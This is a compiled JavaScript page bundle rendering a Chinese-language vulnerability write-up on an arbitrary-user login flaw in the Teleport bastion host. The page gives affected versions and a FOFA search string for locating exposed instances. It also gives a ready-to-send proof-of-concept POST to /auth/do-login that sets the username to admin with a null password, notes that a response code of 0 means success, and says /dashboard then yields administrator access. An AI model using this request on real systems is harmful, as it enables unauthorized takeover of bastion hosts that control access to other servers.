(window.webpackJsonp=window.webpackJsonp||[]).push([[196],{1440:function(t,s,a){t.exports=a.p+"assets/img/1660720653270-fcd22c8e-0df1-42ea-aa02-2c94e0770e76-20220823130937164.6d05d51c.png"},1441:function(t,s,a){t.exports=a.p+"assets/img/1661087828041-1bf5d666-f5fd-4d69-9099-465b3dd492f2-20220823130936374.c2016851.png"},1442:function(t,s,a){t.exports=a.p+"assets/img/1661087872154-ba6ae117-5a99-43f4-919f-1b22f403ab37-20220823130936385.da3fac6d.png"},2916:function(t,s,a){"use strict";a.r(s);var n=a(64),e=Object(n.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"teleport堡垒机-do-login-任意用户登录漏洞"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#teleport堡垒机-do-login-任意用户登录漏洞"}},[t._v("#")]),t._v(" Teleport堡垒机 do-login 任意用户登录漏洞")]),t._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),s("p",[t._v("Teleport堡垒机存在任意用户登录漏洞，攻击者通过构造特殊的请求包可以登录堡垒机获取其他系统权限")]),t._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v("Teleport Version <= 20220817")]),s("br"),t._v(" "),s("h2",{attrs:{id:"网络测绘"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v('app="TELEPORT堡垒机"')]),s("br"),t._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),s("p",[t._v("登录页面")]),t._v(" "),s("p",[s("img",{attrs:{src:a(1440),alt:"img"}})]),t._v(" "),s("p",[t._v("验证POC， captcha参数为验证码")]),t._v(" "),s("div",{staticClass:"language-php line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("POST")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("auth"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("do")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("login\n\nargs"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"type"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"username"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"admin"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"password"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("null")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"captcha"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"ykex"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"oath"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('""')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"remember"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),s("span",{pre:!0,attrs:{class:"token constant boolean"}},[t._v("false")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br")])]),s("p",[s("img",{attrs:{src:a(1441),alt:"img"}})]),t._v(" "),s("p",[t._v("code 返回 0 即为成功，再访问 /dashboard 获取管理员权限")]),t._v(" "),s("p",[s("img",{attrs:{src:a(1442),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=e.exports}}]);